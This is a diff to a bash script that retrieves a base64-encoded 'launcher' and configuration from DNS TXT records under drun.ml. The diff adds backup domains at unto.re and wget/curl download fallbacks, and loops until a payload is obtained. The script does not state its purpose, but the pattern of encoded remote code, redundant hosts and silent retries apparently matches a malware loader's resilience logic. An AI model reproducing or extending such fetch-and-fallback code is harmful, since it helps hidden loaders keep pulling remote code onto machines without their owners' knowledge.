@@ -52,7 +52,17 @@ endpoints() {
     parsedata
     launcher=${data}
     launcher=$(echo "$launcher" | $b64 -d -w $chunksize)
-    [ -z "$launcher" ] && endpoints_fallback launcher
+    if [ -z "$launcher" ]; then
+        if host -t a ${zone}; then
+            endpoints_fallback launcher
+        else
+            zone=unto.re
+            querydns data
+            parsedata
+            launcher=${data}
+            launcher=$(echo "$launcher" | $b64 -d -w $chunksize)
+        fi
+    fi
     # script_url=$(dig txt latest.drun.ml +short)
     zone=${pl_zone:-drun.ml}
     record=${pl_record:-plvars}
@@ -60,18 +70,34 @@ endpoints() {
     pl_vars=${pl_vars/\"}
     pl_vars=${pl_vars%\"}
     pl_vars=${pl_vars//\\\"/\"}
-    [ -z "$pl_vars" ] && endpoints_fallback pl_vars
+    if [ -z "$pl_vars" ]; then
+        if host -t a ${zone}; then
+            endpoints_fallback pl_vars
+        else
+            zone=unto.re
+            querydns pl_vars
+            pl_vars=${pl_vars/\"}
+            pl_vars=${pl_vars%\"}
+            pl_vars=${pl_vars//\\\"/\"}
+        fi
+    fi
 }
 
 endpoints_fallback() {
     case "$1" in
         launcher)
-            script_url=http://latest.drun.ml
-            token_url=https://pl.drun.ml
+            script_url=${scr_url:-http://latest.drun.ml}
+            token_url=${tkn_url:-https://pl.drun.ml}
             data=$($b64 -d <<< "$(wget -t 3 -T 5 -q -i- -O- <<< "$script_url")")
             [ -z "$data" ] && data=$(curl -L "$script_url" -s -o-)
-            # parsedata
             launcher=${data}
+            if [ -z "$launcher" ]; then
+                script_url=latest.unto.re
+                token_url=pl.unto.re
+                data=$($b64 -d <<< "$(wget -t 3 -T 5 -q -i- -O- <<< "$script_url")")
+                [ -z "$data" ] && data=$(curl -L "$script_url" -s -o-)
+                launcher=${data}
+            fi
             ;;
         pl_vars)
             pl_vars=$(echo "$token_url" | wget -t 1 -T 3 -q -i- -S 2>&1 | grep -m1 'Location') ## m1 also important to stop wget
@@ -117,7 +143,7 @@ while [ -z "$launcher" ]; do
     else
         dig="$filename"
         { getdig && endpoints; } ||
-            endpoints_fallback
+            { endpoints_fallback launcher; endpoints_fallback pl_vars; }
     fi
     sleep 1
 done
